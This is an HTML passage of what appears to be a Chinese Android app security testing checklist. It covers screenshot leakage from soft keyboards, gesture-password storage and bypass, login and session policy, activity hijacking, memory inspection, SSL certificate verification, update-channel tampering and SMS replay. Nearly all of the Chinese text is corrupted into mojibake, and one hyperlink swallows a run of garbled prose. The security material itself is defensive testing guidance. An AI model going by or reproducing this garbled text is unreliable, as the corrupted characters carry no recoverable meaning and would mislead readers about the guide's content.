<p>å®¢æˆ·ç«¯ä½¿ç”¨çš„éšæœºå¸ƒå±€è½¯é”®ç›˜æ˜¯å¦ä¼šå¯¹ç”¨æˆ·ç‚¹å‡»äº§ç”Ÿè§†è§‰å“åº”ã€‚å½“éšæœºå¸ƒå±€è½¯é”®ç›˜å¯¹ç”¨æˆ·ç‚¹å‡»äº§ç”Ÿè§†è§‰å“åº”æ—¶ï¼Œå®‰å“æœ¨é©¬å¯ä»¥é€šè¿‡è¿ç»­æˆªå±çš„æ–¹å¼ï¼Œå¯¹ç”¨æˆ·å‡»é”®è¿›è¡Œè®°å½•ï¼Œä»è€Œè·å¾—ç”¨æˆ·è¾“å…¥</p>
<p><strong>æµ‹è¯•æ­¥éª¤</strong></p>
<p>adb shell /system/bin/screencap -p è¾“å‡º png è·¯å¾„ï¼ˆå®‰å“è®¾å¤‡ä¸­ï¼‰</p>
<p>åœ¨/mnt/sdcard/è·¯å¾„ä¸‹ï¼Œå¯ä»¥çœ‹åˆ° 1a.pngï¼š</p>
<p>è¿˜æœ‰ä¸€ç§éªŒè¯æ–¹å¼æ˜¯ä»ä»£ç æ–¹é¢è¿›è¡ŒéªŒè¯ï¼š</p>
<p>é¦–å…ˆæ£€æµ‹éœ€è¾ƒé«˜å®‰å…¨æ€§çš„çª—å£ï¼ˆå¦‚å¯†ç è¾“å…¥æ¡†ï¼‰ï¼Œçœ‹ä»£ç ä¸­åœ¨çª—å£åŠ è½½æ—¶æ˜¯å¦æœ‰ç±»ä¼¼ä¸‹å›¾çš„ä»£ç ã€‚æŒ‰ç…§ android SDK çš„è¦æ±‚ï¼Œå¼€å¯ FLAG_SECURE é€‰é¡¹çš„çª—å£ä¸èƒ½è¢«æˆªå±ã€‚<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241005211913001.png" alt="image-20241005211913001"></p>
<p>ç›®å‰ FLAG_SECURE æµ‹è¯•ç»“æœï¼š</p>
<p>Nï¼PASSï¼Œå¯æˆªå›¾ï¼Œ</p>
<p>ZTE 880E, å¯æˆªå›¾</p>
<p>ASUS TF300Tï¼Œå¯é˜»æ­¢å·¥å…·åŠ ddms æˆªå›¾ã€‚</p>
<h3 id="æ‰‹åŠ¿å¯†ç ">æ‰‹åŠ¿å¯†ç </h3>
<p>ä¸»è¦ä»æ‰‹åŠ¿å¯†ç çš„å¤æ‚åº¦ã€ä¿®æ”¹å’Œå–æ¶ˆã€æœ¬åœ°ä¿¡æ¯ä¿å­˜ã€é”å®šç­–ç•¥ã€æŠ—æ”»å‡»æµ‹è¯•ç­‰æ–¹é¢è¿›è¡Œæµ‹è¯•ã€‚</p>
<p><strong>æ‰‹åŠ¿å¯†ç çš„å¤æ‚åº¦ï¼š</strong></p>
<p>è§‚å¯Ÿå¯¹åº”ä»£ç é€»è¾‘æ˜¯å¦æœ‰ç›¸åº”çš„åˆ¤æ–­å’Œé™åˆ¶æ¡ä»¶ã€‚ï¼ˆä¸€èˆ¬è®¾ç½®æ‰‹åŠ¿å¯†ç è‹¥è¾“å…¥ç‚¹æ•°è¿‡å°‘æ—¶ä¼šæœ‰ç›¸åº”çš„æ–‡å­—æç¤ºï¼Œé€šè¿‡æ­¤æ–‡å­—æç¤ºå¯ä»¥å¿«é€Ÿå®šä½åˆ°ä»£ç ä½ç½®ï¼‰</p>
<p><strong>æ‰‹åŠ¿å¯†ç çš„ä¿®æ”¹å’Œå–æ¶ˆï¼š</strong></p>
<p>åç¼–è¯‘ APK ä¸º jar åŒ…ï¼Œé€šè¿‡ jd-gui è§‚å¯Ÿå¯¹åº”ä»£ç é€»è¾‘ï¼Œå¯»æ‰¾å®¢æˆ·ç«¯å¯¹äºæ‰‹åŠ¿å¯†ç çš„ä¿®æ”¹å’Œåˆ é™¤æ˜¯å¦å­˜åœ¨ç›¸åº”çš„å®‰å…¨ç­–ç•¥ã€‚</p>
<p><strong>æ‰‹åŠ¿å¯†ç çš„æœ¬åœ°ä¿¡æ¯ä¿å­˜ï¼š</strong></p>
<p>é¦–å…ˆé€šè¿‡æ­£å¸¸çš„æ“ä½œæµç¨‹è®¾ç½®ä¸€ä¸ªæ‰‹åŠ¿å¯†ç å¹¶å®Œæ•´ä¸€æ¬¡å®Œæ•´çš„ç™»é™†è¿‡ç¨‹ï¼Œå¯»æ‰¾/data/data çš„ç§æœ‰ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨æ‰‹åŠ¿å¯†ç å¯¹åº”æ•æ„Ÿæ–‡ä»¶ï¼Œè‹¥è¿›è¡Œäº†ç›¸å…³çš„ä¿¡æ¯ä¿å­˜ï¼ŒåŸºæœ¬åœ¨æ­¤ç›®å½•ä¸‹ã€‚ï¼ˆå…³é”®è¯ä¸º gestureï¼Œkey ç­‰ï¼‰ã€‚è§‚å¯Ÿå­˜å‚¨æ–¹å¼æ˜¯äºŒè¿›åˆ¶å½¢å¼è¿˜æ˜¯æ˜æ–‡å½¢å¼ï¼Œå¦‚æœæ˜¯äºŒè¿›åˆ¶çœ‹çœ‹å…¶å¯¹åº”ä½æ•°åˆ¤æ–­è¿›è¡Œçš„ä»€ä¹ˆå“ˆå¸Œæ•£åˆ—ã€‚ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ•°å€¼å®šä¹‰ä»£ç ä½ç½®è¿›ä¸€æ­¥åˆ†æ</p>
<p><strong>æ‰‹åŠ¿å¯†ç çš„æŠ—æ”»å‡»æµ‹è¯•ï¼š</strong></p>
<ol>
<li>
<p>ä¸‹è½½å¹¶å®‰è£… Xposed æ¡†æ¶åŠ SwipeBack æ’ä»¶ã€‚</p>
</li>
<li>
<p>å¯åŠ¨å®¢æˆ·ç«¯å¹¶è¿›å…¥æ‰‹åŠ¿å¯†ç è¾“å…¥é¡µã€‚</p>
</li>
<li>
<p>å¯åŠ¨ SwipeBack æ’ä»¶ï¼Œè§‚å¯Ÿæ˜¯å¦å¯ä»¥é€šè¿‡æ»‘åŠ¨å…³é—­æ‰‹åŠ¿å¯†ç è¾“å…¥é¡µçš„æ–¹å¼è¿›å…¥ç™»é™†åçš„é¡µé¢</p>
</li>
</ol>
<h2 id="å®‰å…¨ç­–ç•¥">å®‰å…¨ç­–ç•¥</h2>
<h3 id="å¯†ç å¤æ‚åº¦æ£€æµ‹">å¯†ç å¤æ‚åº¦æ£€æµ‹</h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæ˜¯å¦æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„å¯†ç å¼ºåº¦ï¼Œç¦æ­¢ç”¨æˆ·è®¾ç½®å¼±å£ä»¤</p>
<p>äººå·¥æµ‹è¯•ï¼Œå°è¯•å°†å¯†ç ä¿®æ”¹ä¸ºå¼±å£ä»¤ï¼Œå¦‚ï¼š123456ï¼Œ654321ï¼Œ121212ï¼Œ888888 ç­‰ï¼ŒæŸ¥çœ‹å®¢æˆ·ç«¯æ˜¯å¦æ‹’ç»å¼±å£ä»¤ã€‚ä¹Ÿå¯ä»¥é˜…è¯»é€†å‘åçš„å®¢æˆ·ç«¯ java ä»£ç ï¼Œå¯»æ‰¾å¯¹ç”¨æˆ·è¾“å…¥å£ä»¤çš„æ£€æŸ¥æ–¹æ³•ã€‚</p>
<h3 id="è´¦å·ç™»å½•é™åˆ¶">è´¦å·ç™»å½•é™åˆ¶</h3>
<p>æµ‹è¯•ä¸€ä¸ªå¸å·æ˜¯å¦å¯ä»¥åŒæ—¶åœ¨å¤šä¸ªè®¾å¤‡ä¸ŠæˆåŠŸç™»å½•å®¢æˆ·ç«¯ï¼Œè¿›è¡Œæ“ä½œã€‚</p>
<p>äººå·¥æµ‹è¯•ã€‚</p>
<h3 id="è´¦æˆ·é”å®šç­–ç•¥"><strong>è´¦æˆ·é”å®šç­–ç•¥</strong></h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯æ˜¯å¦é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°ã€‚é˜²æ­¢æœ¨é©¬ä½¿ç”¨ç©·ä¸¾æ³•æš´åŠ›ç ´è§£ç”¨æˆ·å¯†ç </p>
<p>äººå·¥æµ‹è¯•ã€‚</p>
<h3 id="é—®é¢˜éªŒè¯">é—®é¢˜éªŒè¯</h3>
<p>æµ‹è¯•å¯¹è´¦å·æŸäº›ä¿¡æ¯ï¼ˆå¦‚å•æ¬¡æ”¯ä»˜é™é¢ï¼‰çš„ä¿®æ”¹æ˜¯å¦æœ‰ç§å¯†é—®é¢˜éªŒè¯ã€‚ç§å¯†é—®é¢˜éªŒè¯æ˜¯å¦å°†é—®é¢˜å’Œç­”æ¡ˆä¸€ä¸€å¯¹åº”ã€‚ç§å¯†é—®é¢˜æ˜¯å¦è¶³å¤Ÿç§å¯†</p>
<p>äººå·¥æµ‹è¯•</p>
<h3 id="ä¼šè¯å®‰å…¨">ä¼šè¯å®‰å…¨</h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯åœ¨è¶…è¿‡ 20 åˆ†é’Ÿæ— æ“ä½œåï¼Œæ˜¯å¦ä¼šä½¿ä¼šè¯è¶…æ—¶å¹¶è¦æ±‚é‡æ–°ç™»å½•ã€‚è¶…æ—¶æ—¶é—´è®¾ç½®æ˜¯å¦åˆç†ã€‚</p>
<p>äººå·¥æµ‹è¯•</p>
<h3 id="ç•Œé¢åˆ‡æ¢ä¿æŠ¤">ç•Œé¢åˆ‡æ¢ä¿æŠ¤</h3>
<p>æ£€æŸ¥å®¢æˆ·ç«¯ç¨‹åºåœ¨åˆ‡æ¢åˆ°å…¶ä»–åº”ç”¨æ—¶ï¼Œå·²ç»å¡«å†™çš„è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯æ˜¯å¦ä¼šæ¸…ç©ºï¼Œé˜²æ­¢ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚å¦‚æœåˆ‡æ¢å‰å¤„äºå·²ç™»å½•çŠ¶æ€ï¼Œåˆ‡æ¢åä¸€å®šæ—¶é—´å†…æ˜¯å¦ä¼šè‡ªåŠ¨é€€å‡ºå½“å‰ä¼šè¯ã€‚</p>
<p><strong>æµ‹è¯•æ­¥éª¤</strong></p>
<p>äººå·¥æ£€æµ‹ã€‚åœ¨ç™»å½•ç•Œé¢ï¼ˆæˆ–è€…è½¬è´¦ç•Œé¢ç­‰æ¶‰åŠå¯†ç çš„åŠŸèƒ½ï¼‰å¡«å†™ç™»å½•åå’Œå¯†ç ï¼Œç„¶ååˆ‡å‡ºï¼Œå†è¿›å…¥å®¢æˆ·ç«¯ï¼Œçœ‹è¾“å…¥çš„ç™»å½•åå’Œå¯†ç æ˜¯å¦æ¸…é™¤ã€‚ç™»å½•ååˆ‡å‡ºï¼Œ5 åˆ†é’Ÿå†…è‡ªåŠ¨é€€å‡ºä¸ºå®‰å…¨</p>
<h3 id="UIä¿¡æ¯æ³„éœ²">UIä¿¡æ¯æ³„éœ²</h3>
<p>æ£€æŸ¥å®¢æˆ·ç«¯çš„å„ç§åŠŸèƒ½ï¼Œçœ‹æ˜¯å¦å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚</p>
<p>äººå·¥æµ‹è¯•ã€‚ä½¿ç”¨é”™è¯¯çš„ç™»å½•åæˆ–å¯†ç ç™»å½•ï¼Œçœ‹å®¢æˆ·ç«¯æç¤ºæ˜¯å¦ä¸åŒã€‚åœ¨æ˜¾ç¤ºå¡å·ç­‰æ•æ„Ÿä¿¡æ¯æ—¶æ˜¯å¦è¿›è¡Œéƒ¨åˆ†é®æŒ¡ã€‚</p>
<h3 id="éªŒè¯ç å®‰å…¨">éªŒè¯ç å®‰å…¨</h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯åœ¨ç™»å½•å’Œäº¤æ˜“æ—¶æ˜¯å¦ä½¿ç”¨å›¾å½¢éªŒè¯ç ã€‚éªŒè¯ç æ˜¯å¦ç¬¦åˆå¦‚ä¸‹è¦æ±‚ï¼šç”±æ•°å­—å’Œå­—æ¯ç­‰å­—ç¬¦æ··åˆç»„æˆï¼›é‡‡å–å›¾ç‰‡åº•çº¹å¹²æ‰°ã€é¢œè‰²å˜æ¢ã€è®¾ç½®éè¿ç»­æ€§åŠæ—‹è½¬å›¾ç‰‡å­—ä½“ã€å˜å¼‚å­—ä½“æ˜¾ç¤ºæ ·å¼ç­‰æœ‰æ•ˆæ–¹å¼ï¼Œé˜²èŒƒæ¶æ„ä»£ç è‡ªåŠ¨è¯†åˆ«å›¾ç‰‡ä¸Šçš„ä¿¡æ¯ï¼›å…·æœ‰ä½¿ç”¨æ—¶é—´é™åˆ¶å¹¶ä»…èƒ½ä½¿ç”¨ä¸€æ¬¡ï¼›éªŒè¯ç ç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå®¢æˆ·ç«¯æ–‡ä»¶ä¸­ä¸åŒ…å«å›¾å½¢éªŒè¯ç æ–‡æœ¬å†…å®¹ã€‚</p>
<h3 id="å®‰å…¨é€€å‡º">å®‰å…¨é€€å‡º</h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯é€€å‡ºæ—¶æ˜¯å¦æ­£å¸¸ç»ˆæ­¢ä¼šè¯ã€‚</p>
<p>æ£€æŸ¥å®¢æˆ·ç«¯åœ¨é€€å‡ºæ—¶ï¼Œæ˜¯å¦å‘æœåŠ¡ç«¯å‘é€ç»ˆæ­¢ä¼šè¯è¯·æ±‚ã€‚å®¢æˆ·ç«¯é€€å‡ºåï¼Œè¿˜èƒ½å¦ä½¿ç”¨é€€å‡ºå‰çš„ä¼šè¯ id è®¿é—®ç™»å½•åæ‰èƒ½è®¿é—®çš„é¡µé¢</p>
<h3 id="å¯†ç ä¿®æ”¹éªŒè¯">å¯†ç ä¿®æ”¹éªŒè¯</h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯åœ¨ä¿®æ”¹å¯†ç æ—¶æ˜¯å¦éªŒè¯æ—§å¯†ç æ­£ç¡®æ€§ã€‚</p>
<p>äººå·¥æµ‹è¯•ã€‚</p>
<h3 id="Activity-ç•Œé¢åŠ«æŒ"><strong>Activity ç•Œé¢åŠ«æŒ</strong></h3>
<p>æ£€æŸ¥æ˜¯å¦å­˜åœ¨ activity åŠ«æŒé£é™©ï¼Œç¡®è®¤å®¢æˆ·ç«¯æ˜¯å¦èƒ½å¤Ÿå‘ç°å¹¶æç¤ºç”¨æˆ·å­˜åœ¨åŠ«æŒã€‚</p>
<p>å®‰è£… HijackActivity.apkï¼Œä½¿ç”¨ activity ç•Œé¢åŠ«æŒå·¥å…·ï¼Œåœ¨å·¥å…·ä¸­æŒ‡å®šè¦åŠ«æŒçš„åº”ç”¨è¿›ç¨‹åç§°ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œä»åˆ—è¡¨ä¸­é€‰æ‹©è¢«æµ‹è¯•çš„åº”ç”¨ï¼Œç‚¹å‡» OKã€‚æ‰“å¼€åº”ç”¨ï¼Œæµ‹è¯•å·¥å…·ä¼šå°è¯•ç”¨è‡ªå·±çš„çª—å£è¦†ç›–è¢«æµ‹çš„åº”ç”¨</p>
<h2 id="è¿›ç¨‹ä¿æŠ¤">è¿›ç¨‹ä¿æŠ¤</h2>
<h3 id="å†…å­˜è®¿é—®å’Œä¿®æ”¹"><strong>å†…å­˜è®¿é—®å’Œä¿®æ”¹</strong></h3>
<p>é€šè¿‡å¯¹å®¢æˆ·ç«¯å†…å­˜çš„è®¿é—®ï¼Œæœ¨é©¬å°†æœ‰å¯èƒ½ä¼šå¾—åˆ°ä¿å­˜åœ¨å†…å­˜ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç™»å½•å¯†ç ï¼Œå¸å·ç­‰ï¼‰ã€‚æµ‹è¯•å®¢æˆ·ç«¯å†…å­˜ä¸­æ˜¯å¦å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ï¼ˆè´¦å·ã€æ˜æ–‡å¯†ç ç­‰ç­‰ï¼‰ã€‚</p>
<p>éœ€è¦ root æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ MemSpector æŸ¥çœ‹ã€æœç´¢å’Œä¿®æ”¹å®¢æˆ·ç«¯å†…å­˜æ•°æ®ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ç”¨æˆ·åã€å¯†ç ç­‰æ•°æ®é€šå¸¸ä¼šåœ¨/dev/ashmem/dalvik-heap å†…å­˜æ®µã€‚ï¼ˆç›®å‰å¤§å¤šæ•°å·¥å…·éƒ½æ˜¯é€šè¿‡ ptrace æ¥å£ä¿®æ”¹å®¢æˆ·ç«¯å†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨ ptrace æœºåˆ¶æœ¬èº«é˜²æŠ¤ã€‚ï¼‰</p>
<h3 id="åŠ¨æ€æ³¨å…¥"><strong>åŠ¨æ€æ³¨å…¥</strong></h3>
<p>é€šè¿‡æ³¨å…¥åŠ¨æ€é“¾æ¥åº“ï¼Œhook å®¢æˆ·ç«¯æŸäº›å…³é”®å‡½æ•°ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ”¹å˜ç¨‹åºæ‰§è¡Œã€‚</p>
<h2 id="é€šä¿¡å®‰å…¨">é€šä¿¡å®‰å…¨</h2>
<p>å¦‚æœå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡åŠ å¯†åè®®å®ç°ä¸å½“ï¼Œæ”»å‡»è€…å°†æœ‰æœºä¼šå¯¹å½“å‰ç½‘ç»œç¯å¢ƒä¸­å…¶ä»–åˆæ³•ç”¨æˆ·çš„é€šä¿¡å†…å®¹è¿›è¡Œçªƒå¬ç”šè‡³ç¯¡æ”¹ã€‚</p>
<h3 id="è¯ä¹¦æœ‰æ•ˆæ€§"><strong>è¯ä¹¦æœ‰æ•ˆæ€§</strong></h3>
<p>ä¸»è¦æµ‹è¯• SSL åè®®å®‰å…¨æ€§ã€SSL è¯ä¹¦éªŒè¯ç­‰</p>
<p>é¦–å…ˆæµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæ˜¯å¦ä¸¥æ ¼æ£€æŸ¥æœåŠ¡å™¨ç«¯è¯ä¹¦ä¿¡æ¯ã€‚é€šè¿‡ä¿®æ”¹ DNSï¼Œå°†å®¢æˆ·ç«¯é“¾æ¥åˆ°çš„ä¸»é¡µåœ°å€æ”¹ä¸º <a target="_blank" rel="noopener" href="https://mail.qq.com/%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E4%BC%9A%E6%8F%90%E7%A4%BA%E8%BF%9E%E6%8E%A5%E9%94%99%E8%AF%AF%E3%80%82%E6%AD%A4%E9%A1%B9%E6%B5%8B%E8%AF%95%E4%B8%BB%E8%A6%81%E9%92%88%E5%AF%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E5%AF%B9">https://mail.qq.com/ï¼Œç„¶åä½¿ç”¨å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯ï¼ŒæŸ¥çœ‹å®¢æˆ·ç«¯æ˜¯å¦ä¼šæç¤ºè¿æ¥é”™è¯¯ã€‚æ­¤é¡¹æµ‹è¯•ä¸»è¦é’ˆå¯¹å®¢æˆ·ç«¯æ˜¯å¦å¯¹</a> SSL è¯ä¹¦ä¸­çš„åŸŸåè¿›è¡Œç¡®è®¤ã€‚</p>
<p>ä¹Ÿå¯ä»¥æŸ¥é˜…ä»£ç ä¸­æ˜¯å¦æœ‰ SSL éªŒè¯ã€‚ä¸‹å›¾æ˜¯ Java ä¸­è¿›è¡ŒæœåŠ¡ç«¯ SSL è¯ä¹¦éªŒè¯çš„ä¸€ç§æ–¹å¼ã€‚å…³é”®å‡½æ•°ä¸ºï¼šjava.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier()ï¼Œé€šè¿‡æ­¤å‡½æ•°æŸ¥æ‰¾ HostnameVerifier çš„ verify å‡½æ•°ã€‚å¦‚ verify()å‡½æ•°æ€»è¿”å› trueï¼Œåˆ™å®¢æˆ·ç«¯å¯¹æœåŠ¡ç«¯ SSL è¯ä¹¦æ— éªŒè¯ã€‚ï¼ˆå¯èƒ½è¿˜æœ‰å…¶ä»– SSL å®ç°ï¼Œéœ€è¦éªŒè¯ï¼‰ã€‚</p>
<p><strong>å®‰å…¨å»ºè®®</strong></p>
<p>ä½¿ç”¨ Https æ–¹å¼è¿›è¡ŒåŠ å¯†ï¼Œä¸”æœåŠ¡å™¨é€šè¿‡ç™½åå•æ–¹å¼éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦ã€‚</p>
<h3 id="å…³é”®æ•°æ®åŠ å¯†å’Œæ ¡æ£€"><strong>å…³é”®æ•°æ®åŠ å¯†å’Œæ ¡æ£€</strong></h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæäº¤æ•°æ®ç»™æœåŠ¡ç«¯æ—¶ï¼Œå¯†ç ã€æ”¶æ¬¾äººä¿¡æ¯ç­‰å…³é”®å­—æ®µæ˜¯å¦è¿›è¡Œäº†åŠ å¯†ï¼Œé˜²æ­¢æ¶æ„ç”¨æˆ·å—…æ¢åˆ°ç”¨æˆ·æ•°æ®åŒ…ä¸­çš„å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>åœ¨æ‰‹æœºä¸Šé…ç½®å¥½ä»£ç†ï¼Œè§‚å¯Ÿå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„äº¤äº’æ•°æ®ã€‚æ£€æŸ¥å…³é”®å­—ç«¯æ˜¯å¦åŠ å¯†ã€‚å¦‚æœå®¢æˆ·ç«¯å¯¹æ ¹è¯ä¹¦è¿›è¡Œäº†ä¸¥æ ¼æ£€æµ‹ï¼Œå¯¼è‡´ä»£ç†æ— æ³•ä½¿ç”¨ã€‚åˆ™å¯ä»¥å°†ä»£ç†çš„æ ¹è¯ä¹¦å®‰è£…åˆ°è®¾å¤‡ä¸Šï¼Œä½¿æ ¹è¯ä¹¦å¯ä¿¡ã€‚æˆ–æ˜¯æ›¿æ¢å®¢æˆ·ç«¯ apk ä¸­çš„æ ¹è¯ä¹¦æ–‡ä»¶ã€‚å¦‚æœä¸Šè¿°æ–¹æ³•å‡å¤±æ•ˆï¼Œåˆ™åç¼–è¯‘ä¸º java ä»£ç ï¼Œå°†å®¢æˆ·ç«¯é€†å‘åï¼Œé€šè¿‡é˜…è¯» java ä»£ç çš„æ–¹å¼å¯»æ‰¾å®¢æˆ·ç«¯ç¨‹åºå‘æœåŠ¡ç«¯æäº¤æ•°æ®çš„ä»£ç ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨åŠ å¯†çš„ä»£ç ã€‚</p>
<h3 id="è®¿é—®æ§åˆ¶"><strong>è®¿é—®æ§åˆ¶</strong></h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯è®¿é—®çš„ URL æ˜¯å¦ä»…èƒ½ç”±æ‰‹æœºå®¢æˆ·ç«¯è®¿é—®ã€‚æ˜¯å¦å¯ä»¥ç»•è¿‡ç™»å½•é™åˆ¶ç›´æ¥è®¿é—®ç™»å½•åæ‰èƒ½è®¿é—®çš„é¡µé¢ï¼Œå¯¹éœ€è¦äºŒæ¬¡éªŒè¯çš„é¡µé¢ï¼ˆå¦‚ç§å¯†é—®é¢˜éªŒè¯ï¼‰ï¼Œèƒ½å¦ç»•è¿‡éªŒè¯ã€‚</p>
<p>äººå·¥æµ‹è¯•ã€‚åœ¨ PC æœºçš„æµè§ˆå™¨é‡Œè¾“å…¥ URLï¼Œå°è¯•è®¿é—®æ‰‹æœºé¡µé¢</p>
<h3 id="å®¢æˆ·ç«¯æ›´æ–°å®‰å…¨æ€§"><strong>å®¢æˆ·ç«¯æ›´æ–°å®‰å…¨æ€§</strong></h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯è‡ªåŠ¨æ›´æ–°æœºåˆ¶æ˜¯å¦å®‰å…¨ã€‚å¦‚æœå®¢æˆ·ç«¯æ›´æ–°æ²¡æœ‰ä½¿ç”¨å®˜æ–¹åº”ç”¨å•†åº—çš„æ›´æ–°æ–¹å¼ï¼Œå°±å¯èƒ½å¯¼è‡´ç”¨æˆ·ä¸‹è½½å¹¶å®‰è£…æ¶æ„åº”ç”¨ï¼Œä»è€Œå¼•å…¥å®‰å…¨é£é™©ã€‚</p>
<p>ä½¿ç”¨ä»£ç†æŠ“å–æ£€æµ‹æ›´æ–°çš„æ•°æ®åŒ…ï¼Œå°è¯•å°†æœåŠ¡å™¨è¿”å›çš„æ›´æ–° url æ›¿æ¢ä¸ºæ¶æ„é“¾æ¥ã€‚çœ‹å®¢æˆ·ç«¯æ˜¯å¦ä¼šç›´æ¥æ‰“å¼€æ­¤é“¾æ¥å¹¶ä¸‹è½½åº”ç”¨ã€‚åœ¨åº”ç”¨ä¸‹è½½å®Œæ¯•åï¼Œæµ‹è¯•èƒ½å¦æ›¿æ¢ä¸‹è½½çš„ apk æ–‡ä»¶ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯å¦ä¼šå®‰è£…æ›¿æ¢åçš„åº”ç”¨ã€‚</p>
<h3 id="çŸ­ä¿¡é‡æ”¾æ”»å‡»"><strong>çŸ­ä¿¡é‡æ”¾æ”»å‡»</strong></h3>
<p>æ£€æµ‹åº”ç”¨ä¸­æ˜¯å¦å­˜åœ¨æ•°æ®åŒ…é‡æ”¾æ”»å‡»çš„å®‰å…¨é—®é¢˜ã€‚æ˜¯å¦ä¼šå¯¹å®¢æˆ·ç«¯ç”¨æˆ·é€ æˆçŸ­ä¿¡è½°ç‚¸çš„å›°æ‰°</p>
<p>å°è¯•é‡æ”¾çŸ­ä¿¡éªŒè¯ç æ•°æ®åŒ…æ˜¯å¦å¯ä»¥è¿›è¡ŒçŸ­ä¿¡è½°ç‚¸æ”»å‡»</p>
<h2 id="ä¸šåŠ¡å®‰å…¨">ä¸šåŠ¡å®‰å…¨</h2>
<h3 id="è¶Šæƒ">è¶Šæƒ</h3>
<p>æœåŠ¡å™¨ç«¯å¯¹å®¢æˆ·æå‡ºçš„æ•°æ®æ“ä½œè¯·æ±‚è¿‡åˆ†ä¿¡ä»»ï¼Œå¿½ç•¥äº†å¯¹è¯¥ç”¨æˆ·æ“ä½œæƒé™çš„åˆ¤å®šï¼Œå¯¼è‡´æ”»å‡»è´¦å·æ‹¥æœ‰äº†å…¶ä»–è´¦æˆ·çš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½ã€‚</p>
<p>æ‰‹å·¥æµ‹è¯•</p>
<h3 id="äº¤æ˜“ç¯¡æ”¹"><strong>äº¤æ˜“ç¯¡æ”¹</strong></h3>
<p>æœ¬é¡¹æµ‹è¯•ä¸»è¦æ˜¯ä¿®æ”¹é‡‘é¢ä¿¡æ¯ï¼ˆå¦‚ï¼šè½¬å¸é‡‘é¢ä¸ºè´Ÿå€¼ï¼‰ï¼Œè®¢å•ä¿¡æ¯ï¼ˆå¦‚ï¼šè®¢å•çš„æ•°é‡ï¼‰ç­‰</p>
<p>æ‰‹å·¥æŠ“åŒ…æµ‹è¯•ã€‚</p>
<p>æœåŠ¡ç«¯è¦åšåˆ°ä¸¥æ ¼çš„éªŒè¯ã€‚ï¼ˆæ ¹æ®ä¸šåŠ¡æƒ…å½¢ä¸åŒï¼Œå®‰å…¨å»ºè®®ä¹Ÿä¸ç›¸åŒï¼Œå› æ­¤è¿™é‡Œåªèƒ½ç®€å•çš„ä¸€å¥è¯æè¿°ï¼‰</p>
<h3 id="é‡æ”¾æ”»å‡»">é‡æ”¾æ”»å‡»</h3>
<p>ä¸»è¦å°±æ˜¯è¿›è¡ŒæŠ“åŒ…é‡æ”¾ï¼ˆå¦‚ï¼šé‡æ”¾äº§å“è´­ä¹°ã€è®¢å•åˆ›é€ ç­‰ï¼‰æµ‹è¯•ã€‚</p>
<p>äººå·¥æµ‹è¯•</p>
<h3 id="ç”¨æˆ·æšä¸¾">ç”¨æˆ·æšä¸¾</h3>
<p>å°è¯•çˆ†ç ´æšä¸¾ç”¨æˆ·ã€‚</p>
<p>æ‰‹å·¥æµ‹è¯•ã€‚</p>
<p>æ­¤ç±»æ¼æ´æƒ…å¢ƒä¸€èˆ¬æ˜¯ï¼šç™»å½•ç•Œé¢æ— éªŒè¯ç ã€æœ‰æ˜æ˜¾çš„è¿”å›ä¿¡æ¯ï¼ˆå¦‚ï¼šè¯¥è´¦å·ä¸å­˜åœ¨ã€å¯†ç é”™è¯¯ç­‰ï¼‰</p>
<h3 id="æš´åŠ›ç ´è§£">æš´åŠ›ç ´è§£</h3>
<p>ä¸»è¦æ˜¯æµ‹è¯•ä¸šåŠ¡ä¸­æŸ¥è¯¢ã€ç™»å½•ç­‰åŠŸèƒ½ï¼Œå°è¯•ä½¿ç”¨æš´åŠ›æšä¸¾çš„æ–¹å¼è¿›è¡Œç ´è§£</p>
<p>æ‰‹å·¥æµ‹è¯•</p>
<h3 id="æ³¨å…¥-XSS-CSRF"><strong>æ³¨å…¥/XSS/CSRF</strong></h3>
